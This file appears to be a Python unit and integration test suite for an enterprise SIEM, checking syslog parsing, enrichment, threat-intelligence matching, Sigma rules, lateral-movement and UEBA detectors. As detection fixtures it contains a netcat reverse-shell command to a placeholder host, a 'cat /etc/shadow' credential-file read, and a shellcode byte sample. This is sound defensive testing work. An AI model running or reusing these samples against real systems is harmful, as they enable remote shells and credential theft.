# -*- coding: utf-8 -*-
"""
==============================================================================
ENTERPRISE SIEM SUITE COMPREHENSIVE VERIFICATION (test_enterprise_siem.py)
==============================================================================
Automated unit and integration test suite validating Sections 1, 2, 3, and 4:
1. Ingestion: RFC 3164 / 5424 Syslog Server & REST API Ingestion
2. Processing: ECS Normalization, GeoIP Enrichment, CTI Matching, PII Masking
3. Correlation: Stateful CEP Attack Chains, Sigma Rule Engine, DGA, Lateral Movement
4. UEBA: User Behavioral Profiler, Impossible Travel, Dormant Accounts, Risk Scorer, User Action Inspector
==============================================================================
"""

import sys
import os
import time
from datetime import datetime

# Add project root to sys.path for direct execution
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Import Enterprise Modules
from modules.syslog_server import syslog_server
from modules.ecs_normalizer import ecs_normalizer
from modules.geoip_enricher import geoip_enricher
from modules.cti_matcher import cti_matcher
from modules.pii_masker import pii_masker
from modules.stateful_correlation import stateful_correlation_engine
from modules.sigma_engine import sigma_engine
from modules.dga_detector import dga_detector
from modules.lateral_movement import lateral_movement_tracker
from modules.user_profile_engine import user_profile_engine
from modules.impossible_travel import impossible_travel_detector
from modules.dormant_account import dormant_account_detector
from modules.risk_scorer import risk_scorer

passed_tests = 0
total_tests = 0

def run_test(name, condition, details=""):
    global passed_tests, total_tests
    total_tests += 1
    if condition:
        passed_tests += 1
        print(f"  [PASS] {name} -> {details}")
    else:
        print(f"  [FAIL] {name} -> {details}")

print("=" * 85)
print("     ENTERPRISE SIEM ENGINES (SECTIONS 1-4) VERIFICATION BENCHMARK")
print("=" * 85)

# ==============================================================================
# SECTION 1: INGESTION TESTS
# ==============================================================================
print("\n--- [SECTION 1: LOG INGESTION & INTEGRATION] ---")

# 1.1 RFC 3164 Syslog Parse
rfc3164_raw = "<13>Feb 25 16:30:00 debian sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2"
res3164 = syslog_server.parse_syslog(rfc3164_raw, "192.168.1.100")
run_test("Syslog RFC 3164 Parser", res3164["app_name"] == "sshd" and res3164["pid"] == 12345, f"Parsed App: {res3164['app_name']}, PID: {res3164['pid']}")

# 1.2 RFC 5424 Syslog Parse
rfc5424_raw = "<165>1 2026-08-25T16:30:00Z firewall-01 cisco 999 ID47 [exampleSDID@32473 iut=\"3\"] User admin logged in"
res5424 = syslog_server.parse_syslog(rfc5424_raw, "10.0.0.1")
run_test("Syslog RFC 5424 Parser", res5424["hostname"] == "firewall-01" and res5424["app_name"] == "cisco", f"Hostname: {res5424['hostname']}, App: {res5424['app_name']}")

# 1.3 eBPF Kernel Event Data Structure & Buffer Mapping
from modules.ebpf_kernel_telemetry import EventData, EVENT_EXEC
fake_raw_event = EventData(
    pid=4321,
    ppid=1000,
    uid=1001,
    comm=b"nc",
    filename=b"/usr/bin/nc",
    args=b"nc -e /bin/sh 192.168.1.50 4444",
    saddr=0,
    daddr=0,
    dport=0,
    timestamp_ns=123456789,
    event_type=EVENT_EXEC
)
run_test("eBPF Ctypes Struct Mapping", fake_raw_event.pid == 4321 and fake_raw_event.comm == b"nc" and b"-e /bin/sh" in fake_raw_event.args, f"PID: {fake_raw_event.pid}, Comm: {fake_raw_event.comm.decode()}, Args: {fake_raw_event.args.decode()[:30]}")

# ==============================================================================
# SECTION 2: PROCESSING & ENRICHMENT TESTS
# ==============================================================================
print("\n--- [SECTION 2: DATA PROCESSING, PARSING & ENRICHMENT] ---")

# 2.1 PII Masking (Credit Cards, TCKN, Passwords, Tokens)
sample_pii = "User logged in with password='SuperSecretPassword123' and CC: 4532-0150-1234-5678 and TCKN: 10000000146"
masked_pii = pii_masker.mask(sample_pii)
run_test("PII Masker", "[MASKED_SECRET]" in masked_pii and "[MASKED_CREDIT_CARD]" in masked_pii and "[MASKED_TCKN]" in masked_pii, f"Sanitized: {masked_pii}")

# 2.2 ECS Normalization
sample_event = {
    "source_type": "auth",
    "raw": "Accepted password for devops from 192.0.2.45 port 55432 ssh2",
    "timestamp": "2026-08-25T16:30:00Z"
}
ecs_doc = ecs_normalizer.normalize(sample_event)
run_test("ECS Normalizer", ecs_doc["user"]["name"] == "devops" and ecs_doc["source"]["ip"] == "192.0.2.45" and ecs_doc["event"]["action"] == "ssh_login_success", f"User: {ecs_doc['user']['name']}, Action: {ecs_doc['event']['action']}")

# 2.3 GeoIP & ASN Enrichment
enriched_ecs = geoip_enricher.enrich_ecs_event(ecs_doc)
geo_info = enriched_ecs["source"].get("geo", {})
run_test("GeoIP Enricher", geo_info.get("country_iso_code") == "US", f"Country: {geo_info.get('country_name')}, City: {geo_info.get('city_name')}")

# 2.4 CTI / Threat Intelligence Matcher
cti_hit = cti_matcher.match_ip("194.26.29.42")
run_test("CTI Matcher (Known C2)", cti_hit is not None and "Cobalt Strike" in cti_hit["threat"], f"Detected: {cti_hit['threat'] if cti_hit else 'None'}")

# ==============================================================================
# SECTION 3: THREAT DETECTION & CORRELATION TESTS
# ==============================================================================
print("\n--- [SECTION 3: THREAT DETECTION & CORRELATION ENGINES] ---")

# 3.1 DGA Malware Domain Detector
dga_res = dga_detector.analyze("xkqw98234jks98sdf.biz")
legit_res = dga_detector.analyze("github.com")
run_test("DGA Domain Detector", dga_res["is_dga"] is True and legit_res["is_dga"] is False, f"Malicious Score: {dga_res['score']} (DGA={dga_res['is_dga']}) vs Legit: {legit_res['score']}")

# 3.2 Sigma Detection Rules Evaluation
sigma_event = {
    "process": {"command_line": "cat /etc/shadow"},
    "user": {"name": "attacker"}
}
sigma_matches = sigma_engine.evaluate(sigma_event)
run_test("Sigma Rules Engine", len(sigma_matches) > 0 and sigma_matches[0]["rule_id"] == "sigma-lnx-001", f"Matched Rule: {sigma_matches[0]['title'] if sigma_matches else 'None'}")

# 3.3 Lateral Movement Tracker (Internal Fan-out)
lateral_alert = None
for i in range(1, 7):
    res = lateral_movement_tracker.record_connection("192.168.1.50", f"192.168.1.{100 + i}", 22)
    if res:
        lateral_alert = res
run_test("Lateral Movement Tracker", lateral_alert is not None and lateral_alert["type"] == "INTERNAL_PORT_SCAN_FANOUT", f"Lateral Alert: {lateral_alert['description'] if lateral_alert else 'None'}")

# 3.4 Stateful CEP Correlation (Brute Force -> Success Chain)
stateful_correlation_engine.ip_event_history.clear()
stateful_alert = None
for _ in range(4):
    stateful_correlation_engine.process_event({"source": {"ip": "198.51.100.99"}, "user": {"name": "admin"}, "event": {"action": "ssh_login_failed"}})
stateful_alert = stateful_correlation_engine.process_event({"source": {"ip": "198.51.100.99"}, "user": {"name": "admin"}, "event": {"action": "ssh_login_success"}})
run_test("Stateful CEP Correlation", stateful_alert is not None and "Brute-Force" in stateful_alert["chain_name"], f"Correlated Attack Chain: {stateful_alert['chain_name'] if stateful_alert else 'None'}")

# 3.5 Memory Threat Hunter & YARA Shellcode Pattern Scanner
from modules.memory_threat_hunter import memory_threat_hunter
sample_shellcode_payload = b"\x48\x31\xc0\x48\x31\xdb\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x6a\x2a\x58\x0f\x05"
yara_hit = memory_threat_hunter.pure_scanner.match(sample_shellcode_payload)
run_test("Memory Hunter YARA Scanner", len(yara_hit) > 0 and "CobaltStrike" in yara_hit[0]["rule"], f"Rule: {yara_hit[0]['rule'] if yara_hit else 'None'}, Strings: {yara_hit[0]['strings'][0] if yara_hit else 'None'}")

# ==============================================================================
# SECTION 4: UEBA & BEHAVIORAL ANALYTICS TESTS
# ==============================================================================
print("\n--- [SECTION 4: UEBA & BEHAVIORAL ANALYTICS] ---")

# 4.1 Impossible Travel Detector (15 Mins: Frankfurt -> Sydney)
impossible_travel_detector.user_last_locations.clear()
t_now = time.time()
impossible_travel_detector.evaluate("alice", "185.220.101.5", current_time=t_now - 900) # Frankfurt 15 mins ago
travel_alert = impossible_travel_detector.evaluate("alice", "1.1.1.1", current_time=t_now) # Sydney now
run_test("Impossible Travel Detector", travel_alert is not None and travel_alert["calculated_velocity_kmh"] > 1000, f"Distance: {travel_alert.get('distance_km')}km, Speed: {travel_alert.get('calculated_velocity_kmh')}km/h" if travel_alert else "None")

# 4.2 Dormant Account Awakening (>30 Days Inactive)
dormant_account_detector.account_activity["bob"] = {
    "last_active_ts": time.time() - (45 * 86400), # 45 days ago
    "last_active_iso": "2026-07-10T10:00:00Z"
}
dormant_alert = dormant_account_detector.evaluate_activity("bob", "192.168.1.200")
run_test("Dormant Account Awakening", dormant_alert is not None and dormant_alert["days_inactive"] >= 45, f"Awakened after {dormant_alert.get('days_inactive') if dormant_alert else 0} days")

# 4.3 User Profile Engine (Off-Hours Anomaly)
user_profile_engine.profiles["charlie"]["hourly_logins"] = [0]*24
for h in range(9, 18):
    user_profile_engine.profiles["charlie"]["hourly_logins"][h] = 10 # Only works 09:00 - 18:00
off_hours_dt = datetime(2026, 8, 30, 3, 30, 0) # 03:30 AM on Sunday
ueba_anom = user_profile_engine.evaluate_login("charlie", "10.0.0.99", timestamp_dt=off_hours_dt)
run_test("UEBA Off-Hours Anomaly", len(ueba_anom) > 0 and ueba_anom[0]["type"] == "OFF_HOURS_ACCESS_ANOMALY", f"Alert: {ueba_anom[0]['description'] if ueba_anom else 'None'}")

# 4.4 Dynamic Risk Scorer (Time Decay & Tiers)
risk_scorer.user_risk_map.clear()
risk_scorer.add_risk("attacker", 40.0, "Failed Password Burst", is_user=True)
risk_scorer.add_risk("attacker", 50.0, "SUID PrivEsc Attempt", is_user=True)
risk_status = risk_scorer.get_risk("attacker", is_user=True)
tier = risk_scorer.get_tier(risk_status)
run_test("Dynamic Risk Scorer", risk_status >= 80.0 and tier == "CRITICAL", f"Risk Score: {risk_status}/100 -> Tier: {tier}")

# 4.5 User Action, File & Service Inspector
from modules.user_action_inspector import user_action_inspector
svc_parse = user_action_inspector.inspect_command("devops", "192.168.1.50", "pts/1", "sudo systemctl restart nginx")
file_parse = user_action_inspector.inspect_command("developer", "192.168.1.60", "pts/2", "nano /var/www/html/config.php")
run_test("User Action Inspector", svc_parse["target_service"] == "nginx.service" and svc_parse["action_type"] == "SERVICE_CONTROL" and file_parse["target_file"] == "/var/www/html/config.php", f"Service: {svc_parse['target_service']} ({svc_parse['action_type']}) | File: {file_parse['target_file']} ({file_parse['action_type']})")

print("\n" + "=" * 85)
print(f"  RESULT: {passed_tests} / {total_tests} TESTS PASSED SUCCESSFULLY! ({passed_tests/total_tests*100:.1f}%)")
print("=" * 85 + "\n")
